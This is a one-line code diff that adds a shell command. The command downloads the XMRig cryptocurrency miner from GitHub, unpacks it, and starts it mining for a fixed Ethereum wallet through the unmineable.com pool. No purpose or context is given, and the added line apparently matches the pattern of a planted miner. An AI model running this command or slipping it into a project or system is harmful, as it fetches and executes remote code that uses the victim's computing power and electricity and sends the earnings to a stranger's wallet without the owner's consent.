@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ETH:0xdECD2335b531B4db45fC9c7cD80F7c7722D7f6Db.VenoM -p x
